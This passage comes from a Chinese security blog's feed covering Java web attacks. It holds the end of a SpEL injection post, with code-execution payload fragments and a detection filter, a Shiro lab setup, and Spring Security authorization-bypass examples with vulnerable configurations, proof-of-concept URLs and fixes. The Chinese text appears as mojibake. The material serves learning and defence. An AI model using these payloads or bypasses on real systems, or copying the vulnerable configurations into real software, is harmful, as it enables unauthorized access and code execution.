class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">'calc'</span><span class="token punctuation">)</span><span class="token comment">// JDK9æ–°å¢çš„shellï¼Œè¿˜æœªæµ‹è¯•</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">SomeWhitelistedClassNotPartOfJDK</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"jdk.jshell.JShell"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Methods<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>'whatever java code in one statement'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterChain</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Enumeration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpELInjectionFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Regex pattern to detect potential SpEL injections</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Pattern</span> <span class="token constant">SPEL_INJECTION_PATTERN</span> <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"#\\&#123;[^&#125;]+\\&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Initialization code if necessary</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span>            <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">HttpServletRequest</span> httpRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">;</span>            <span class="token comment">// Check query parameters</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> param <span class="token operator">:</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> value <span class="token operator">:</span> values<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential SpEL injection detected in parameter: "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// Check headers</span>            <span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> headerNames <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeaderNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>headerNames<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span> header <span class="token operator">=</span> headerNames<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> headerValue <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span>headerValue<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential SpEL injection detected in header: "</span> <span class="token operator">+</span> header<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Continue with the filter chain</span>        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Cleanup code if necessary</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Method to check if a value contains potential SpEL injection patterns</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">SPEL_INJECTION_PATTERN</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>web.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.example.filters.SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ˜¯springbootï¼Œè¿‡æ»¤å™¨ç±»ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>filters<span class="token punctuation">.</span></span><span class="token class-name">SpELInjectionFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterRegistrationBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@SpringBootApplication</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySpringBootApplication</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">MySpringBootApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">></span></span> <span class="token function">spELInjectionFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">></span></span> registrationBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registrationBean<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registrationBean<span class="token punctuation">.</span><span class="token function">addUrlPatterns</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> registrationBean<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&quot;&gt;https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&quot;&gt;https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93&quot;&gt;https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Shiro Attack</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/15/Shiro-Attack/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/15/Shiro-Attack/</id>
    <published>2024-07-15T13:56:45.000Z</published>
    <updated>2024-07-15T14:11:11.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š<a href="https://natro92.fun/posts/4b382a45/">https://natro92.fun/posts/4b382a45/</a></p><span id="more"></span><hr><h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p>ç¯å¢ƒï¼šjdk1.8 + tomcat 8.5.98 + shiro 1.2.4</p><p>è¿™é‡Œç›´æ¥ç”¨pç¥çš„é¡¹ç›®äº†ï¼š<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p>ä¸‹è½½åç›´æ¥ç”¨IDEAæ‰“å¼€ï¼Œé…ç½®ä¸€ä¸‹tomcatç¯å¢ƒ</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715212213428.png" alt="image-20240715212213428"></p><p>è¿è¡Œé…ç½®</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715213701618.png" alt="image-20240715213701618"></p><blockquote><p>Tipsï¼šå¦‚æœtomcatæ§åˆ¶å°å‡ºç°ä¹±ç ï¼Œè¯·åœ¨è®¾ç½®-æ§åˆ¶å°ä¸­æ›´æ”¹ç¼–ç ä¸ºUTF-8</p></blockquote><blockquote><p>Tipsï¼šåªæœ‰ä¸‹è½½äº†æºç æ‰èƒ½åœ¨å…¨å±€æœç´¢ä¸­æœåˆ°å¯¹åº”è°ƒç”¨çš„æ–¹æ³•ï¼šè¯·åœ¨ è®¾ç½®-Maven-æ­£åœ¨å¯¼å…¥ å†…ä¿®æ”¹</p></blockquote><p>ç„¶åè®¿é—®å³å¯</p><p><img src="/blog/2024/07/15/Shiro-Attack/image-20240715214344403.png" alt="image-20240715214344403"></p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;a href=&quot;https://natro92.fun/posts/4b382a45/&quot;&gt;https://natro92.fun/posts/4b382a45/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>SpringSecurityæƒé™ç»•è¿‡</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/15/SpringSecurity%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/15/SpringSecurity%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/</id>
    <published>2024-07-15T10:19:13.000Z</published>
    <updated>2024-07-19T02:49:43.843Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¶çƒ­æ‰“é“v2ï¼Œè™½ç„¶å®é™…ä¸Šæ˜¯çº¯è®°å½•ç”¨çš„</p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/13235">https://xz.aliyun.com/t/13235</a></p><span id="more"></span><hr><h1 id="antMatchers-é…ç½®ä¸å½“æƒé™ç»•è¿‡"><a href="#antMatchers-é…ç½®ä¸å½“æƒé™ç»•è¿‡" class="headerlink" title="antMatchers é…ç½®ä¸å½“æƒé™ç»•è¿‡"></a>antMatchers é…ç½®ä¸å½“æƒé™ç»•è¿‡</h1><p>æ¼æ´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@EnableWebSecurity</span><span class="token keyword">public</span> <span class="token keyword">class</span> antMatchersConfig <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">InMemoryUserDetailsManager</span> <span class="token function">userDetailsService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">UserDetails</span> user <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token function">withDefaultPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">username</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"USER"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryUserDetailsManager</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œä½¿ç”¨äº†<code>antMatchers(&quot;/test&quot;).access(&quot;hasRole(&#39;ADMIN&#39;)&quot;)</code>ï¼Œåªæœ‰ADMINæ‰å¯ä»¥è®¿é—®<code>test</code>,ä½†æ˜¯æ²¡æœ‰å»æŒ‰ç…§æ­£å¸¸çš„å†™æ³•:  <code>/test/**</code> ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡<code>/test/</code>ï¼Œæ¥ç»•è¿‡å¯¹<code>/test</code> çš„æ ¡éªŒ</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">mvcMatchers</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/test/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="regexMatchers-é…ç½®ä¸å½“æƒé™ç»•è¿‡"><a href="#regexMatchers-é…ç½®ä¸å½“æƒé™ç»•è¿‡" class="headerlink" title="regexMatchers é…ç½®ä¸å½“æƒé™ç»•è¿‡"></a>regexMatchers é…ç½®ä¸å½“æƒé™ç»•è¿‡</h1><blockquote><p>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…</p></blockquote><p>æ¼æ´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AuthConfig</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Bean</span>      <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          http              <span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"hasRole('ADMIN')"</span><span class="token punctuation">)</span>              <span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token string">"anonymous"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/admin</code>æ­£åˆ™æ²¡å†™å®Œæ•´</p><h2 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin?</span></span><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:8080/admin/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="ä¿®å¤-1"><a href="#ä¿®å¤-1" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><p>å°†æ­£åˆ™å†™å®Œæ•´</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin.*?"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token 